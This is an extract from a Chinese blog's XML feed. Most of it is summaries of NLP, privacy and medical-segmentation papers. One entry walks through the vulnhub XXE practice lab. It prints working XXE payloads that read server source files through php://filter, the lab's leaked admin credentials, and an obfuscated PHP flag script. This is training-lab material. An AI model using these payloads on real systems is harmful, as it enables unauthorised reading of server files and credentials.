    <content type="html"><![CDATA[<img src="/2024/10/13/StackOverflow-%E4%BB%A3%E7%A0%81%E5%AE%9E%E4%BD%93%E8%AF%86%E5%88%AB/image-20241013183201970.png" class="" title="image-20241013183201970"><blockquote><p><em>原文标题：Code and Named Entity Recognition in StackOverflow</em><br><em>原文作者： Jeniya Tabassum, Mounica Maddela, Wei Xu, Alan Ritter</em><br><em>发表期刊： ACL Anthology</em><br><em>原文链接：<a href="https://arxiv.org/pdf/2005.01634">https://arxiv.org/pdf/2005.01634</a></em>  </p></blockquote><h1 id="研究背景"><a href="#研究背景" class="headerlink" title="研究背景"></a>研究背景</h1><p>大量的编程文本语料库在互联网上很容易获得，但仍然缺乏基本的自然语言处理技术来识别代码标记或与软件相关的命名实体。</p><h1 id="主要贡献"><a href="#主要贡献" class="headerlink" title="主要贡献"></a>主要贡献</h1><ul><li>StackOverflow NER语料库: 手动标注了20种类型的命名实体，包括自然语言句子中的所有内联代码</li><li>域内训练的神经NER标记器: 识别20个与软件开发相关的20个细粒度命名实体</li><li>代码令牌识别器：利用StackOveflow代码片段来捕获与代码相关的实体的字符模式，并持续改进NER标记器。</li><li>域内训练ELMo和BERT：F1得分比现有的ELMo增加了14分以上，并显著优于现成的BERT。</li></ul><p>命名实体标记器在提取20种软件相关的命名实体类型时，在StackOverflow上获得了78.41%的F1分数，在GitHub数据上获得了62.69%的F1分数。</p><h1 id="具体实现"><a href="#具体实现" class="headerlink" title="具体实现"></a>具体实现</h1><h2 id="StackOverflow-语料库注释"><a href="#StackOverflow-语料库注释" class="headerlink" title="StackOverflow 语料库注释"></a>StackOverflow 语料库注释</h2><p>定义并注释20种细粒度实体，其中8个与代码相关的实体，12个自然语言实体。同时每个实体的定义都是鼓励最大跨度长度。一个实体平均包含大约1.5个tokens。</p><p>为了更好地理解工作的领域适应性，进进一步标注了来自 GitHub 数据集中 143 个随机抽样仓库的 README 文件和问题报告</p><p>实现了一个新的分词器，以 Twokenizer3 为起点，并添加了额外的正则表达式规则，以避免将与代码相关的标记拆分。</p><h2 id="SoftNER"><a href="#SoftNER" class="headerlink" title="SoftNER"></a>SoftNER</h2><p>该模型利用句子上下文来消除歧义，并利用领域特定的字符表示来处理稀有单词。</p><p>模型的主要结构</p><img src="/2024/10/13/StackOverflow-%E4%BB%A3%E7%A0%81%E5%AE%9E%E4%BD%93%E8%AF%86%E5%88%AB/image-20241013183238959.png" class="" title="image-20241013183238959"><p>该模型有三部分构成：</p><ul><li>嵌入提取层（embedding extraction layer）：为输入句子中的每个单词创建上下文化的ELMo嵌入和两个新的特定于领域的嵌入。</li><li>多层次注意层（multi-level attention layer）：使用嵌入级和单词级注意网络结合这三个单词嵌入。</li><li>双向长短期记忆网络-条件随机场层（BiLSTM-CRF）：使用来自前一层的加权单词表示来预测每个单词的实体类型。</li></ul><h1 id="实验结果"><a href="#实验结果" class="headerlink" title="实验结果"></a>实验结果</h1><p>模型在StackOverflow NER语料库上的性能比较：</p><img src="/2024/10/13/StackOverflow-%E4%BB%A3%E7%A0%81%E5%AE%9E%E4%BD%93%E8%AF%86%E5%88%AB/image-20241013183254305.png" class="" title="image-20241013183254305"><p>域内域外词嵌入性能比较：</p><img src="/2024/10/13/StackOverflow-%E4%BB%A3%E7%A0%81%E5%AE%9E%E4%BD%93%E8%AF%86%E5%88%AB/image-20241013183305497.png" class="" title="image-20241013183305497"><p>代码识别模型比较：</p><img src="/2024/10/13/StackOverflow-%E4%BB%A3%E7%A0%81%E5%AE%9E%E4%BD%93%E8%AF%86%E5%88%AB/image-20241013183319835.png" class="" title="image-20241013183319835"><h1 id="展望"><a href="#展望" class="headerlink" title="展望"></a>展望</h1><p>未来将探索半监督学习和其他领域的自适应方法，实现对实体识别。</p>]]></content>
    
    
    <categories>
      
      <category>论文笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>NLP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vulnhub-xxe漏洞复线</title>
    <link href="/2024/09/27/vulhub-xxe%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <url>/2024/09/27/vulhub-xxe%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h4 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h4><p>[<a href="http://download.vulnhub.com/xxe/XXE.zip">镜像下载</a>]</p><p><a href="https://blog.csdn.net/qq_45514735/article/details/123290712">搭建步骤</a></p><h4 id="nmap扫描靶机IP"><a href="#nmap扫描靶机IP" class="headerlink" title="nmap扫描靶机IP"></a>nmap扫描靶机IP</h4><p>靶机ip为192.168.238.131，并且存在http服务，80端口打开</p><img src="/2024/09/27/vulhub-xxe%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240927165139940.png" class="" title="image-20230213183946471"><h4 id="浏览器访问192-168-238-131"><a href="#浏览器访问192-168-238-131" class="headerlink" title="浏览器访问192.168.238.131"></a>浏览器访问192.168.238.131</h4><p>访问只存在ununtu的apache2的默认界面</p><img src="/2024/09/27/vulhub-xxe%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240927165224063.png" class="" title="image-20240927165224063"><h4 id="访问192-168-238-131-robots-txt"><a href="#访问192-168-238-131-robots-txt" class="headerlink" title="访问192.168.238.131&#x2F;robots.txt"></a>访问192.168.238.131&#x2F;robots.txt</h4><p>（robots.txt文件告诉<a href="http://baike.baidu.com/view/995492.htm">蜘蛛程序</a>在服务器上什么文件是可以被查看的。 ）</p><img src="/2024/09/27/vulhub-xxe%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240927165242246.png" class="" title="image-20240927165242246"><p>紧接着访问&#x2F;xxe，发现登录界面</p><img src="/2024/09/27/vulhub-xxe%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240927165252641.png" class="" title="image-20240927165252641"><h4 id="burpsuites抓包"><a href="#burpsuites抓包" class="headerlink" title="burpsuites抓包"></a>burpsuites抓包</h4><img src="/2024/09/27/vulhub-xxe%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240927165306767.png" class="" title="image-20240927165306767"><p>发现传入数据为xml语言数据传输格式</p><p>打入payload读取xxe.php</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">test</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY  <span class="hljs-keyword">file</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;php://filter/read=convert.base64-encode/resource=xxe.php&quot;</span>&gt;</span>]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span><span class="hljs-symbol">&amp;file;</span><span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>a<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span><br></code></pre></td></tr></table></figure><p>返回数据发现xxe.php</p><img src="/2024/09/27/vulhub-xxe%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240927165332148.png" class="" title="image-20240927165332148"><p>用burpsuite自带的解码工具解码返回的xxe.php代码</p><img src="/2024/09/27/vulhub-xxe%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240927165525248.png" class="" title="image-20240927165525248"><p>读取admin.php，查看代码用户名为administhebest密码的md5值为e6e061838856bf47e1de730719fb2609解密后为admin@123</p><pre><code class="hljs"> &lt;?php            $msg = &#39;&#39;;            if (isset($_POST[&#39;login&#39;]) &amp;&amp; !empty($_POST[&#39;username&#39;])                &amp;&amp; !empty($_POST[&#39;password&#39;])) &#123;          if ($_POST[&#39;username&#39;] == &#39;administhebest&#39; &amp;&amp;               md5($_POST[&#39;password&#39;]) == &#39;e6e061838856bf47e1de730719fb2609&#39;) &#123;              $_SESSION[&#39;valid&#39;] = true;              $_SESSION[&#39;timeout&#39;] = time();              $_SESSION[&#39;username&#39;] = &#39;administhebest&#39;;                          echo &quot;You have entered valid use name and password &lt;br /&gt;&quot;;    $flag = &quot;Here is the &lt;a style=&#39;color:FF0000;&#39; href=&#39;/flagmeout.php&#39;&gt;Flag&lt;/a&gt;&quot;;    echo $flag;           &#125;else &#123;              $msg = &#39;Maybe Later&#39;;           &#125;        &#125;     ?&gt;  &lt;/div&gt; &lt;!-- W00t/W00t --&gt;    &lt;div class = &quot;container&quot;&gt;       &lt;form class = &quot;form-signin&quot; role = &quot;form&quot;         action = &quot;&lt;?php echo htmlspecialchars($_SERVER[&#39;PHP_SELF&#39;]);         ?&gt;&quot; method = &quot;post&quot;&gt;        &lt;h4 class = &quot;form-signin-heading&quot;&gt;&lt;?php echo $msg; ?&gt;&lt;/h4&gt;        &lt;input type = &quot;text&quot; class = &quot;form-control&quot;            name = &quot;username&quot;            required autofocus&gt;&lt;/br&gt;        &lt;input type = &quot;password&quot; class = &quot;form-control&quot;           name = &quot;password&quot; required&gt;        &lt;button class = &quot;btn btn-lg btn-primary btn-block&quot; type = &quot;submit&quot;            name = &quot;login&quot;&gt;Login&lt;/button&gt;</code></pre><p>登录：</p><img src="/2024/09/27/vulhub-xxe%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240927165617204.png" class="" title="image-20240927165617204"><p>找到新的敏感文件</p><img src="/2024/09/27/vulhub-xxe%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240927165630377.png" class="" title="image-20240927165630377"><p>打入payload</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">test</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY  <span class="hljs-keyword">file</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;php://filter/read=convert.base64-encode/resource=flagmeout.php&quot;</span>&gt;</span>]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span><span class="hljs-symbol">&amp;file;</span><span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>a<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span><br></code></pre></td></tr></table></figure><p>读取flagmeout.php</p><img src="/2024/09/27/vulhub-xxe%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240927165756629.png" class="" title="image-20240927165756629"><p>通过判断加密方式为base32编码，先base32解码</p><img src="/2024/09/27/vulhub-xxe%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240927165809150.png" class="" title="image-20240927165809150"><h4 id="读取-etc-falg-php"><a href="#读取-etc-falg-php" class="headerlink" title="读取&#x2F;etc&#x2F;.falg.php"></a>读取&#x2F;etc&#x2F;.falg.php</h4><img src="/2024/09/27/vulhub-xxe%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240927165835573.png" class="" title="image-20240927165835573"><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$_</span>[]++;<span class="hljs-variable">$_</span>[]=<span class="hljs-variable">$_</span>._;<span class="hljs-variable">$_____</span>=<span class="hljs-variable">$_</span>[(++<span class="hljs-variable">$__</span>[])][(++<span class="hljs-variable">$__</span>[])+(++<span class="hljs-variable">$__</span>[])+(++<span class="hljs-variable">$__</span>[])];<span class="hljs-variable">$_</span>=<span class="hljs-variable">$_</span>[<span class="hljs-variable">$_</span>[+_]];<span class="hljs-variable">$___</span>=<span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>[++<span class="hljs-variable">$__</span>[]];<span class="hljs-variable">$____</span>=<span class="hljs-variable">$_</span>=<span class="hljs-variable">$_</span>[+_];<span class="hljs-variable">$_</span>++;<span class="hljs-variable">$_</span>++;<span class="hljs-variable">$_</span>++;<span class="hljs-variable">$_</span>=<span class="hljs-variable">$____</span>.++<span class="hljs-variable">$___</span>.<span class="hljs-variable">$___</span>.++<span class="hljs-variable">$_</span>.<span class="hljs-variable">$__</span>.++<span class="hljs-variable">$___</span>;<span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<span class="hljs-variable">$_</span>=<span class="hljs-variable">$_____</span>;<span class="hljs-variable">$_</span>++;<span class="hljs-variable">$_</span>++;<span class="hljs-variable">$_</span>++;<span class="hljs-variable">$_</span>++;<span class="hljs-variable">$_</span>++;<span class="hljs-variable">$_</span>++;<span class="hljs-variable">$_</span>++;<span class="hljs-variable">$_</span>++;<span class="hljs-variable">$_</span>++;<span class="hljs-variable">$_</span>++;<span class="hljs-variable">$___</span>=+_;<span class="hljs-variable">$___</span>.=<span class="hljs-variable">$__</span>;<span class="hljs-variable">$___</span>=++<span class="hljs-variable">$_</span>^<span class="hljs-variable">$___</span>[+_];<span class="hljs-variable">$Ã</span>=+_;<span class="hljs-variable">$Ã</span>=<span class="hljs-variable">$Ã</span>=<span class="hljs-variable">$Ã</span>=<span class="hljs-variable">$Ã</span>=<span class="hljs-variable">$Ã</span>=<span class="hljs-variable">$Ã</span>=<span class="hljs-variable">$Ã</span>=<span class="hljs-variable">$Ã</span>=<span class="hljs-variable">$Ã</span>=++<span class="hljs-variable">$Ã</span>[];<span class="hljs-variable">$Ã</span>++;<span class="hljs-variable">$Ã</span>++;<span class="hljs-variable">$Ã</span>++;<span class="hljs-variable">$Ã</span>++;<span class="hljs-variable">$Ã</span>++;<span class="hljs-variable">$Ã</span>++;<span class="hljs-variable">$Ã</span>++;<span class="hljs-variable">$Ã</span>++;<span class="hljs-variable">$Ã</span>++;<span class="hljs-variable">$Ã</span>++;<span class="hljs-variable">$Ã</span>++;<span class="hljs-variable">$Ã</span>++;<span class="hljs-variable">$Ã</span>++;<span class="hljs-variable">$Ã</span>++;<span class="hljs-variable">$Ã</span>++;<span class="hljs-variable">$Ã</span>++;<span class="hljs-variable">$Ã</span>++;<span class="hljs-variable">$Ã</span>++;<span class="hljs-variable">$Ã</span>++;<span class="hljs-variable">$Ã</span>++;<span class="hljs-variable">$Ã</span>++;<span class="hljs-variable">$Ã</span>++;<span class="hljs-variable">$Ã</span>++;<span class="hljs-variable">$Ã</span>++;<span class="hljs-variable">$Ã</span>++;<span class="hljs-variable">$Ã</span>++;<span class="hljs-variable">$Ã</span>++;<span class="hljs-variable">$Ã</span>++;<span class="hljs-variable">$Ã</span>++;<span class="hljs-variable">$Ã</span>++;<span class="hljs-variable">$Ã</span>++;<span class="hljs-variable">$Ã</span>++;<span class="hljs-variable">$Ã</span>++;<span class="hljs-variable">$Ã</span>++;<span class="hljs-variable">$Ã</span>++;<span class="hljs-variable">$__</span>(<span class="hljs-string">&#x27;$_=&quot;&#x27;</span>.<span class="hljs-variable">$___</span>.<span class="hljs-variable">$Ã</span>.<span class="hljs-variable">$Ã</span>.<span class="hljs-variable">$Ã</span>.<span class="hljs-variable">$___</span>.<span class="hljs-variable">$Ã</span>.<span class="hljs-variable">$Ã</span>.<span class="hljs-variable">$Ã</span>.<span class="hljs-variable">$___</span>.<span class="hljs-variable">$Ã</span>.<span class="hljs-variable">$Ã</span>.<span class="hljs-variable">$Ã</span>.<span class="hljs-variable">$___</span>.<span class="hljs-variable">$Ã</span>.<span class="hljs-variable">$Ã</span>.<span class="hljs-variable">$Ã</span>.<span class="hljs-variable">$___</span>.<span class="hljs-variable">$Ã</span>.<span class="hljs-variable">$Ã</span>.<span class="hljs-variable">$Ã</span>.<span class="hljs-variable">$___</span>.<span class="hljs-variable">$Ã</span>.<span class="hljs-variable">$Ã</span>.<span class="hljs-variable">$Ã</span>.<span class="hljs-variable">$___</span>.<span class="hljs-variable">$Ã</span>.<span class="hljs-variable">$Ã</span>.<span class="hljs-variable">$Ã</span>.<span class="hljs-variable">$___</span>.<span class="hljs-variable">$Ã</span>.<span class="hljs-variable">$Ã</span>.<span class="hljs-variable">$Ã</span>.<span class="hljs-variable">$___</span>.<span class="hljs-variable">$Ã</span>.<span class="hljs-variable">$Ã</span>.<span class="hljs-variable">$Ã</span>.<span class="hljs-variable">$___</span>.<span class="hljs-variable">$Ã</span>.<span class="hljs-variable">$Ã</span>.<span class="hljs-variable">$Ã</span>.<span class="hljs-variable">$___</span>.<span class="hljs-variable">$Ã</span>.<span class="hljs-variable">$Ã</span>.<span class="hljs-variable">$Ã</span>.<span class="hljs-variable">$___</span>.<span class="hljs-variable">$Ã</span>.<span class="hljs-variable">$Ã</span>.<span class="hljs-variable">$Ã</span>.<span class="hljs-variable">$___</span>.<span class="hljs-variable">$Ã</span>.<span class="hljs-variable">$Ã</span>.<span class="hljs-variable">$Ã</span>.<span class="hljs-variable">$___</span>.<span class="hljs-variable">$Ã</span>.<span class="hljs-variable">$Ã</span>.<span class="hljs-variable">$Ã</span>.<span class="hljs-variable">$___</span>.<span class="hljs-variable">$Ã</span>.<span class="hljs-variable">$Ã</span>.<span class="hljs-variable">$Ã</span>.<span class="hljs-variable">$___</span>.<span class="hljs-variable">$Ã</span>.<span class="hljs-variable">$Ã</span>.<span class="hljs-variable">$Ã</span>.<span class="hljs-variable">$___</span>.<span class="hljs-variable">$Ã</span>.<span class="hljs-variable">$Ã</span>.<span class="hljs-variable">$Ã</span>.<span class="hljs-variable">$___</span>.<span class="hljs-variable">$Ã</span>.<span class="hljs-variable">$Ã</span>.<span class="hljs-variable">$Ã</span>.<span class="hljs-variable">$___</span>.<span class="hljs-variable">$Ã</span>.<span class="hljs-variable">$Ã</span>.<span class="hljs-variable">$Ã</span>.<span class="hljs-variable">$___</span>.<span class="hljs-variable">$Ã</span>.<span class="hljs-variable">$Ã</span>.<span class="hljs-variable">$Ã</span>.<span class="hljs-variable">$___</span>.<span class="hljs-variable">$Ã</span>.<span class="hljs-variable">$Ã</span>.<span class="hljs-variable">$Ã</span>.<span class="hljs-variable">$___</span>.<span class="hljs-variable">$Ã</span>.<span class="hljs-variable">$Ã</span>.<span class="hljs-variable">$Ã</span>.<span class="hljs-string">&#x27;&quot;&#x27;</span>);<span class="hljs-variable">$__</span>(<span class="hljs-variable">$_</span>);<br><br></code></pre></td></tr></table></figure><h4 id="解密后发现像php"><a href="#解密后发现像php" class="headerlink" title="解密后发现像php"></a>解密后发现像php</h4><p>自己写php代码运行，密码为SAFCSP{xxe_is_so_easy}</p><img src="/2024/09/27/vulhub-xxe%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240927165849465.png" class="" title="image-20240927165849465">]]></content>
    
    
    <categories>
      
      <category>靶场练习</category>
      
    </categories>
    
    
    <tags>
      
      <tag>vulnhub</tag>
      
      <tag>xxe</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>查罗塔尔科技大学-差分隐私保护</title>
    <link href="/2024/09/27/%E6%9F%A5%E7%BD%97%E5%A1%94%E5%B0%94%E7%A7%91%E6%8A%80%E5%A4%A7%E5%AD%A6-%E5%B7%AE%E5%88%86%E9%9A%90%E7%A7%81%E4%BF%9D%E6%8A%A4/"/>
    <url>/2024/09/27/%E6%9F%A5%E7%BD%97%E5%A1%94%E5%B0%94%E7%A7%91%E6%8A%80%E5%A4%A7%E5%AD%A6-%E5%B7%AE%E5%88%86%E9%9A%90%E7%A7%81%E4%BF%9D%E6%8A%A4/</url>
    
    <content type="html"><![CDATA[<blockquote><p><em>原文标题：Deep Learning: Differential Privacy Preservation in the Era of Big Data</em><br><em>原文作者：Jalpesh Vasa, Amit Thakkar</em><br><em>发表会议：计算机信息系统学报</em><br><em>原文链接： <a href="https://doi.org/10.1080/08874417.2022.2089775">https://doi.org/10.1080/08874417.2022.2089775</a></em><br><em>主题类型：隐私保护</em>  </p></blockquote><h1 id="论文工作"><a href="#论文工作" class="headerlink" title="论文工作"></a>论文工作</h1><p>本文阐述了一些可能的攻击，阐述了在一些大数据平台中保护隐私的一些基本方法，并讨论了基于深度学习方法在隐私保护方面的有效性。最后给出了一种增强深度学习模型隐私保护的有效方法。</p><p>论文的主要贡献有以下三点：</p><ul><li>提供对大数据时代中几种隐私侵犯攻击的深入洞察。</li><li>研究了深度学习中差分隐私保护的核心思想，以及它们的优缺点。</li><li>为深度学习方法中的隐私保护提供可能的研究方向</li></ul><h1 id="差分隐私实现机制"><a href="#差分隐私实现机制" class="headerlink" title="差分隐私实现机制"></a>差分隐私实现机制</h1><p>拉普拉斯机制和指数机制</p><h1 id="面向大数据的深度学习差分隐私保护"><a href="#面向大数据的深度学习差分隐私保护" class="headerlink" title="面向大数据的深度学习差分隐私保护"></a>面向大数据的深度学习差分隐私保护</h1><h2 id="攻击方法"><a href="#攻击方法" class="headerlink" title="攻击方法"></a>攻击方法</h2><ul><li><p>深度学习中的成员推断攻击：由于训练集和测试集的行为不同而引起。对手推断一个数据集是否存在于训练数据集中。攻击![]<br>模型如下</p></li><li><p>对抗攻击：修改原始图像，有意地通过混淆来干扰深度神经网络。攻击模型如下</p></li><li><p>模型和训练数据提取攻击：从攻击者复制的模型的个人数据中提取模型中训练的参数，从而导致训练集的隐私泄露</p></li><li><p>链接攻击：攻击者将匿名数据与不同数据集中的非匿名数据链接起来，造成隐私泄露。</p></li><li><p>干扰攻击：攻击者通过数据挖掘技术非法获取个人信息</p></li><li><p>关联攻击：攻击者可以根据背景知识生成相关信息，以此获得更多的隐私信息造数据隐私泄露。</p></li></ul><h2 id="隐私保护方法"><a href="#隐私保护方法" class="headerlink" title="隐私保护方法"></a>隐私保护方法</h2><ul><li><p>基于 K-匿名的方法</p><p>使用上述的方法实现数据的隐私保护，实验表明基于 K-匿名的方法不能很好的解决大数据环境下的隐私保护问题</p></li></ul><ul><li><p>基于优化算法方法</p><p>通过实验表明该方法会造成信息损失，同时时间复杂度也更高</p></li><li><p>采用加密的方法实现隐私保护</p></li></ul><p>这些算法的优点如下图所示。如点到点的云系统，该方法的能耗与与合作模型相比降低了 75%。蜜罐加密方案改进了攻击检查和安全性</p><ul><li>基于深度学习的隐私保护方案</li></ul><p>其中多方案差分隐私方法减少了通信花销，同时效率更高。私有卷积深度神经网络在不同的隐私预算中，保持相同的预测准确率。</p><ul><li><p>深度学习的差分隐私保护方法<br>包含 11 种差分隐私保护方案，这些方案提供了数据在深度学习中免受各种攻击的安全性，使端到端学习系统同时具有学习到的特征和分类器。</p><p>其中加密深度神经网络云安全方法，包损失减少 10%，响应时间提高了 5%。</p></li></ul><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>由于大量私人数据的隐私问题，深度学习隐私保护是一个重要的研究领域。如果攻击者访问到用户的个人信息，将会造成用户数据的丢失。一个有效的隐私保护方案对深度学习中隐私保护的增强有很大的影响。</p><p>本篇论文总结了一些常见的隐私保护方案，同时探究不同的隐私保护方案各自的优点。其中基于深度学习的隐私保护方法比其他经典的方法更有效地保护数据隐私。</p>]]></content>
    
    
    <categories>
      
      <category>论文笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>隐私保护</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>浙江大学-Unet3+</title>
    <link href="/2024/09/27/%E6%B5%99%E6%B1%9F%E5%A4%A7%E5%AD%A6-Unet3/"/>
    <url>/2024/09/27/%E6%B5%99%E6%B1%9F%E5%A4%A7%E5%AD%A6-Unet3/</url>
    
    <content type="html"><![CDATA[<blockquote><p>*原文标题：UNET 3+: A FULL-SCALE CONNECTED UNET FOR MEDICAL IMAGE SEGMENTATION</p><p>*原作者:Huimin Huang, Lanfen Lin, Ruofeng Tong, Hongjie Hu,Qiaowei Zhang, Yutaro Iwamoto,Xianhua Han3, Yen-Wei Chen, Jian Wu</p><p>*发表会议：ICASSP 2020-2020 IEEE international conference on acoustics, speech and signal processing (ICASSP).</p><p>*原文链接：<a href="https://arxiv.org/ftp/arxiv/papers/2004/2004.08790.pdf">https://arxiv.org/ftp/arxiv/papers/2004/2004.08790.pdf</a></p><p>*主题类型：深度学习，语义分割</p></blockquote><h1 id="论文工作"><a href="#论文工作" class="headerlink" title="论文工作"></a>论文工作</h1><p>在本文中，我们提出了一种新的 UNet 3+，它利用了全尺寸跳跃连接和深度监督。全尺寸跳跃连接结合了来自不同尺度特征映射的低级细节和高级语义;而深度监督则从全尺寸聚合特征映射中学习分层表示。在精度提高的同时，可以减少网络参数，提高计算效率。同时提出了一种混合损失函数，并设计了一个分类引导模块来增强器官边界，减少非器官图像的过度分割，从而获得更准确的分割结果。</p><h1 id="文章贡献"><a href="#文章贡献" class="headerlink" title="文章贡献"></a>文章贡献</h1><ul><li>设计了一种新颖的 UNet 3+，通过引入全尺寸跳过连接来充分利用多尺度特征，该连接将全尺寸特征图中的低级细节与高级语义结合起来</li><li>开发深度监督，从全尺寸聚合特征图中学习层次表示，优化混合损失函数以增强器官边界</li><li>提出了一种分类引导模块，通过与图像级分类的联合训练来减少对非器官图像的过度分割</li></ul><h1 id="模型对比"><a href="#模型对比" class="headerlink" title="模型对比"></a>模型对比</h1><p>与 UNet 和 UNet++相比，UNet 3+结合了多尺度特征，通过重新设计跳过连接，并利用全尺寸深度监督，提供更少的参数，但产生更准确的位置感知和边界增强分割图。</p><h2 id="特征图构建"><a href="#特征图构建" class="headerlink" title="特征图构建"></a>特征图构建</h2><p>与 Unet 相似都要通过特征提取网络进行特征提取，解码层的构建有所不同，以解码第三层为例，他需要通过编码的第一，第二，第三层通过卷积和池化后以及解码的第四层上采样后，再通过一个 3x3 的卷积获得。</p><h2 id="损失函数"><a href="#损失函数" class="headerlink" title="损失函数"></a>损失函数</h2><p>提出了一种多尺度结构形似指数损失函数（MS-SSIM）</p><p>M 为尺寸总数；μρ，μg，𝜎ρ，𝜎g 分别为 ρ 和 g 的标准差和方差；βm，γm 为每一尺寸的相关系数，C1&#x3D;0.01<em>0.01，C2&#x3D;0.03</em>0.03。</p><p>结合 focal loss 和 miou loss 最后混合损失如下</p><h2 id="分类引导模块（CGM）"><a href="#分类引导模块（CGM）" class="headerlink" title="分类引导模块（CGM）"></a>分类引导模块（CGM）</h2><p>通过添加分类任务设计本模块，本文即添加了识别一个图像受否是细胞。</p><p>经过 dropout，卷积，池化，激活等一系列操作后将在最深层生成一张二维向量（表示有&#x2F;没有器官的概率），并通过 Argmax 函数将其转化为{0，1}单一输出（即有无器官），最后将单个输出与侧面分割输出相乘</p><h1 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h1><h2 id="数据集"><a href="#数据集" class="headerlink" title="数据集"></a>数据集</h2><p>肝脏分割的数据集来自 ISBI LiTS 2017 挑战赛：包含 131 张 CT 扫描，其中 103 张用于训练，28 张用于测试<br>脾脏数据来自医院，其中 40 张用于训练，9 张用于测试</p><h2 id="实验结果"><a href="#实验结果" class="headerlink" title="实验结果"></a>实验结果</h2><p>将 Unet3+分别与 Unet Unet++ 做对比。分别使用了 Vgg16<br>和 ResNet-101 作为主干网络</p><p>结果表明 Unet3+的参数最少且精度最高</p><p>与其他五种语义分割网络对比</p><p>Unet3+（Hybrid loss + CGM）的精度最高</p><h2 id="分割后的图片对比"><a href="#分割后的图片对比" class="headerlink" title="分割后的图片对比"></a>分割后的图片对比</h2><p>Unet3+所展现的语义分割效果最佳</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>本文提出的 Unet3+（Hybrid loss + CGM）以更少的参数实现了高效的网络架构，再 Unet3+中引入分类引导模块和混合损失函数得到了更精确的位置感知和分割图。</p>]]></content>
    
    
    <categories>
      
      <category>论文笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>深度学习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>法国EURECOM-X-Ray-TLS</title>
    <link href="/2024/09/26/France-EURECOM-X-Ray-TLS/"/>
    <url>/2024/09/26/France-EURECOM-X-Ray-TLS/</url>
    
